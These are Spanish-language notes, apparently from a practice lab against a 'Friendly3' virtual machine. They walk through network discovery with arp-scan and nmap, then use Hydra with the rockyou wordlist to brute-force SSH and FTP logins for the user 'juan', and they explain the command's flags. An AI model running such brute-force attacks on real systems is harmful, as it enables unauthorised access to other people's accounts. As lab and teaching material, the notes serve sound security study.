- Maquinas que vamos a usas **Kali Linux** y **Friendly3**.
    
    Hacemos un escaneo de la red.
    
    ```Bash
    sudo arp-scan -I eth0 --localnet
    ```
    
    ![[Imagenes/image 21.png|image 21.png]]
    

Nuestra maquina victima es la **10.0.3.8** podemos ver que tipo de maquina es haciendo un Ping.

```Bash
ping -c 1 10.0.3.8
```

![[Imagenes/image 1 10.png|image 1 10.png]]

Vemos que es una maquina Linux

- Vamos a hacer un nmap de los puertos abiertos.
    
    ```Bash
    nmap -p- --open -sS -sC -sV -min-rate 2000 -n -vvv -Pn 10.0.3.8 -oN escaneo
    ```
    
    ![[Imagenes/image 2 9.png|image 2 9.png]]
    

  

Para hacer un **ataque de fuerza bruta debo conocer** o bien el **usuario o la contraseña**.

Para hacer estos ataques usaremos la herramienta Hydra.

- Vemos que esta abierto el puerto 80, así que vamos a probar a introducir en nuestro navegador web la IP de la maquina victima
    
    ![[Imagenes/image 3 8.png|image 3 8.png]]
    
    Nos a cargado una simple pagina web donde se dirige a un **usuario** llamado **juan.**
    
      
    
- Vamos a atacar el **puerto 22 del SSH**
    
    **NOTA:** Mirar la sección Notas el punto numero 2 para los diccionarios.
    

```Bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://10.0.3.8
```

![[Imagenes/image 4 7.png|image 4 7.png]]

Nos a encontrado una posible coincidencia **usuario: juan contraseña: alexis**

  

**Desglose de los parámetros del comando:**

1. `**hydra**`: Este es el comando principal que ejecuta la herramienta Hydra.
2. `**l juan**`: Este parámetro especifica el nombre de usuario fijo que se intentará usar durante el ataque. En este caso, el usuario es `juan`.
3. `**P /usr/share/wordlists/rockyou.txt**`:
    - `P` indica que se usará un archivo que contiene una lista de posibles contraseñas, conocida como _wordlist_.
    - `/usr/share/wordlists/rockyou.txt` es la ruta del archivo _rockyou.txt_, una lista muy conocida de contraseñas comunes que suele utilizarse para ataques de fuerza bruta.
4. **NOTA:**
    
    - **Minúscula (**`**l**` **y** `**p**`**)**: Se usan para especificar un único valor (usuario o contraseña fija).
    - **Mayúscula (**`**L**` **y** `**P**`**)**: Se usan para trabajar con listas (de usuarios o contraseñas).
    
      
    
5. `**ssh://10.0.3.8**`:
    - Aquí se especifica el protocolo y el objetivo del ataque.
    - `ssh://` indica que Hydra intentará conectarse a un servicio SSH (normalmente en el puerto 22 por defecto).
    - `10.0.3.8` es la dirección IP del objetivo donde se encuentra el servicio SSH.

  

**En resumen**, este comando intenta autenticar al usuario `juan` en el servidor SSH ubicado en `10.0.3.8`, probando todas las contraseñas de la lista contenida en el archivo `rockyou.txt`.

  

- Vamos a probar que funcionan las credenciales que nos a sacado.
    
    ```Bash
    ssh juan@10.0.3.8 
    ```
    
    ![[Imagenes/image 5 7.png|image 5 7.png]]
    

  

- Vamos a atacar el **puerto 21 del FTP**
    
    Vamos pensar que el usuario es el mismo.
    
    ```Bash
    hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://10.0.3.8
    ```
    
    ![[Imagenes/image 6 6.png|image 6 6.png]]
    

  

- Probamos las credenciales
    
    ```Bash
    ftp 10.0.3.8
    ```
    
    ![[Imagenes/image 7 5.png|image 7 5.png]]
    

  

Como nota decir que siempre es mejor entrar como SSH ya que se obtiene mas acceso a la maquina.